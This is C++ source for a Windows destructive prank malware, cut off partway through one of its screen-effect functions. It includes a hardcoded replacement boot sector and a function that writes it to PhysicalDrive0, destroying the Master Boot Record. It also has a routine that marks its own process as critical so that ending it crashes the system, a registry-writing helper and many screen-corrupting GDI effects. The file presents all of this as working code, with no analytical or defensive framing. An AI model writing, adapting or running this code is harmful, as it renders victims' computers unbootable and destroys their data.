#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

const unsigned char MasterBootRecord[] = { 0xEB, 0x00, 0xEA, 0x07, 0x7C, 0x00, 0x00, 0xF8, 0xFC, 0x0E, 0x17, 0x0E, 0x1F, 0x31, 0xC0, 0x31,
0xDB, 0xB9, 0xFF, 0x00, 0xBE, 0x07, 0x7C, 0xBC, 0xFE, 0xFF, 0x89, 0xE7, 0x40, 0xCD, 0x10, 0xB8,
0x00, 0xB8, 0x8E, 0xC0, 0x91, 0xB4, 0x2E, 0xF3, 0xAB, 0x56, 0xBE, 0x5C, 0x7D, 0xBA, 0x05, 0x01,
0xE8, 0x32, 0x01, 0x91, 0xCD, 0x1A, 0x52, 0xBD, 0x30, 0x30, 0xBA, 0x11, 0x1C, 0xBB, 0x00, 0x1C,
0x59, 0x5E, 0xAD, 0x01, 0xC8, 0x7A, 0x02, 0xB7, 0x28, 0x56, 0x50, 0x31, 0xC9, 0xE8, 0x2F, 0x01,
0xE8, 0xA5, 0x00, 0x42, 0x42, 0xE8, 0x86, 0x00, 0x4A, 0x4A, 0xE8, 0x81, 0x00, 0x87, 0xDA, 0xB1,
0x04, 0xE8, 0x7F, 0x00, 0xE8, 0x27, 0x01, 0x87, 0xDA, 0xF4, 0x38, 0xF7, 0x75, 0x2E, 0x52, 0x28,
0xDA, 0xF6, 0xDA, 0x78, 0xFC, 0x80, 0xFA, 0x03, 0x5A, 0x7F, 0x21, 0xBE, 0x07, 0x7C, 0x81, 0xC5,
0x00, 0x01, 0xB1, 0x26, 0x51, 0xB1, 0x04, 0xE8, 0x59, 0x00, 0xE8, 0x01, 0x01, 0x83, 0xEE, 0x25,
0x59, 0xE2, 0xF1, 0x81, 0xFD, 0x00, 0x3A, 0x7C, 0xA1, 0xF9, 0xEB, 0x18, 0xEB, 0x2F, 0x80, 0xF6,
0x34, 0x80, 0xFB, 0x20, 0x75, 0xAA, 0x4A, 0x80, 0xFA, 0x07, 0x7F, 0x91, 0x45, 0x95, 0x3C, 0x3A,
0x95, 0x7C, 0x87, 0xF8, 0xBE, 0x62, 0x7D, 0xBA, 0x05, 0x03, 0x72, 0x02, 0xB2, 0x1E, 0x31, 0xDB,
0xF9, 0xE8, 0xA1, 0x00, 0x31, 0xC0, 0xCD, 0x16, 0xEA, 0x07, 0x7C, 0x00, 0x00, 0x43, 0xB4, 0x01,
0xCD, 0x16, 0x74, 0xCD, 0x30, 0xE4, 0xCD, 0x16, 0x3C, 0x1B, 0x74, 0xEC, 0xEB, 0xC0, 0xBE, 0x20,
0x7D, 0xB1, 0x02, 0x88, 0xF0, 0x98, 0x97, 0xB0, 0x50, 0xF6, 0xEA, 0x01, 0xC7, 0xA5, 0xA5, 0xA5,
0xA5, 0xA5, 0x83, 0xC7, 0x46, 0xE2, 0xF6, 0xC3, 0xB1, 0x1A, 0x89, 0xCF, 0xB8, 0xDF, 0x74, 0xF6,
0xC3, 0x01, 0x75, 0x02, 0xB0, 0xDC, 0xAB, 0x51, 0xF9, 0xB4, 0x00, 0xB1, 0x05, 0xF3, 0xAB, 0x73,
0x06, 0xB4, 0x0F, 0xAB, 0xF5, 0xEB, 0xF2, 0xB4, 0x74, 0xAB, 0x83, 0xC7, 0x36, 0x59, 0xE2, 0xE6,
0xC3, 0x00, 0xDE, 0x04, 0x7C, 0x4E, 0xDD, 0x04, 0x20, 0x07, 0xB2, 0x08, 0xC1, 0x0C, 0x1E, 0x4B,
0xC1, 0x0C, 0xB2, 0x08, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x07, 0x20, 0x00,
0x20, 0x00, 0x5C, 0x07, 0xDC, 0x07, 0x2F, 0x07, 0xFB, 0x07, 0xDB, 0x07, 0x7E, 0x70, 0x22, 0x74,
0x40, 0x07, 0x20, 0x07, 0xB3, 0x70, 0x20, 0x08, 0xB3, 0x70, 0x20, 0x08, 0x53, 0x53, 0x41, 0x55,
0x4F, 0x59, 0x4E, 0x4F, 0x57, 0xB4, 0x02, 0xCD, 0x10, 0xB1, 0x03, 0xAC, 0xB4, 0x0A, 0xCD, 0x10,
0xE2, 0xF9, 0xB2, 0x1E, 0xF5, 0x72, 0xEE, 0xBA, 0x0F, 0x1A, 0xB4, 0x02, 0xCD, 0x10, 0xC3, 0x95,
0xBF, 0xFC, 0x00, 0x86, 0xE0, 0xAA, 0x83, 0xC7, 0x31, 0x86, 0xC4, 0xAA, 0x95, 0xC3, 0x52, 0xB0,
0xB6, 0xE6, 0x43, 0x88, 0xD0, 0xE6, 0x42, 0xD0, 0xE8, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6,
0x61, 0xB6, 0x09, 0xE8, 0x15, 0x00, 0x29, 0xD0, 0x92, 0xE8, 0x0F, 0x00, 0x39, 0xD0, 0x7F, 0xF9,
0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xE8, 0x0F, 0x00, 0x5A, 0xC3, 0x31, 0xC0, 0xE6, 0x43, 0xE4,
0x40, 0x86, 0xE0, 0xE4, 0x40, 0x86, 0xE0, 0xC3, 0xBA, 0xDA, 0x03, 0xEC, 0xA8, 0x08, 0x74, 0xFB,
0xEC, 0xA8, 0x08, 0x75, 0xFB, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
    return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
    HKEY hKey;
    DWORD dwDisposition;
    LONG result;
    result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
    RegCloseKey(hKey);
    return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;
    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL) {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

DWORD WINAPI shader1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * sqrt(y ^ i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCERASE);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI shader2(LPVOID lpvd) { //credits to Sensist2K05
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    float colorShift = 400.0;
    float colorIntensity = 0.15;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * sqrt(x & y ^ x > i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
                hslcolor.s = 3.f;
                hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI shapes(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        Ellipse(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
        Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        Rectangle(hdc, rand() % w, rand() % h, rand() % w, rand() % h);
        ArcTo(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        Arc(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        LineTo(hdc, rand() % w, rand() % h);
        RoundRect(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        POINT vertices[] = { { rand() % w, rand() % h }, { rand() % w, rand() % h }, { rand() % w, rand() % h } };
        Polygon(hdc, vertices, sizeof(vertices) / sizeof(vertices[0]));
        Sleep(25);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI textout(LPVOID lpvd) {
    int x = GetSystemMetrics(0);
    int y = GetSystemMetrics(1);
    while (true) {
        for (int i = 0; i < x; i++) {
            HDC hdc = GetDC(0);
            LPCSTR text = "2c34q6z735";
            SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
            TextOutA(hdc, rand() % x, rand() % y, text, strlen(text));
            ReleaseDC(0, hdc);
        }
        Sleep(1000);
    }
}

DWORD WINAPI shader3(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb ^= x - y | i;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

DWORD WINAPI shader4(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * sin(15));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
                if (i == 1) i = (int)i & 1;
            }
        }
        i++;
        StretchBlt(hdc, 10, 10, screenWidth - 20, screenHeight - 20, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI sustainepic(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        BitBlt(hdc, -1, 0, w, h, hdc, 0, 0, 0x1900AC010E);
        BitBlt(hdc, w - 1, 0, w, h, hdc, 0, 0, PATCOPY);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader5(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].r += x + int(128.0 + 128 * sin(3.1415 * x / 32.0));
            rgbScreen[i].g += y + int(128.0 + 128 * sin(3.1415 * x / 64.0));
            rgbScreen[i].b += x + int(128.0 + 128 * sin(3.1415 * x / 128.0));
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

DWORD WINAPI invcc(LPVOID lpParam) {
    int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
    int incrementation = 10;
    int x = 10, y = 10;
    while (true) {
        HDC hdc = GetDC(0);
        x += incrementation * sx;
        y += incrementation * sy;
        HRGN square = CreateRectRgn(x, y, x + 100, y + 100);
        InvertRgn(hdc, square);
        if (y >= GetSystemMetrics(1)) {
            sy = -1;
        }
        if (x >= GetSystemMetrics(0)) {
            sx = -1;
        }
        if (y == 0) {
            sy = 1;
        }
        if (x == 0) {
            sx = 1;
        }
        DeleteObject(square);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader6(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 100 == 0)
                v = rand() % 2;
            *((BYTE*)data + 4 * i + v) *= x & y;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, desk);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI textout1(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HFONT hfnt = CreateFontA(rand() % 59 + 1, rand() % 39 + 1, rand() % 3600, rand() % 3600, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, hfnt);
        LPCSTR things[] = {
            "2c34q6z735", "sin()", "cos()",
            "tan()", "log()", "sqrt()", "cbrt()"
        };
        int thing = rand() % _countof(things);
        SetTextColor(hdc, RGB(0, 0, rand() % 255));
        TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
        DeleteObject(hfnt);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI shader7(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = (x | (i * 4)) ^ (y | (i * 4));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI icons(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 10 + 1) * GetSystemMetrics(SM_CXICON), (rand() % 10 + 1) * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader8(LPVOID lpvd) { //credits to fr4ctalz
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmi = { 0 };
    HBITMAP bmp;
    bmi.bmiHeader.biSize = sizeof(bmi);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = screenHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = nullptr;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, reinterpret_cast<void**>(&rgbquad), nullptr, 0);
    SelectObject(hdcCopy, bmp);
    int i = 0;
    float frequencyX = 12.0;
    float frequencyY = 8.0;
    float amplitudeX = 12.0;
    float amplitudeY = 6.0;
    float timeScale = 20.0;
    float colorShift = 400.0;
    float colorIntensity = 0.15;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int j = 4 * i;
                float fx = (j + (j * sin(x / frequencyX)) + j + (j * cos(y / frequencyY)) + j + (j * sin((x + y) / timeScale)) + j + (j * sin(sqrt((double)(x * x + y * y)) / amplitudeY))) / amplitudeX;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / colorShift + y / static_cast<float>(screenHeight) * colorIntensity, 1.0f);
                hslcolor.s = fmod(hslcolor.s + (x % 20) / 200.0f, 1.0f);
                hslcolor.l = fmod(hslcolor.l + (y % 10) / 100.0f, 1.0f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCAND);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI lines(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        SelectObject(hdc, CreatePen(0, 0, Hue(239)));
        MoveToEx(hdc, rand() % w, 0, 0);
        LineTo(hdc, rand() % w, h);
        ReleaseDC(0, hdc);
        DeleteObject(hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader9(LPVOID lpParam) { //credits to fr4ctalz
    HDC desk = GetDC(0);
    HWND wnd = GetDesktopWindow();
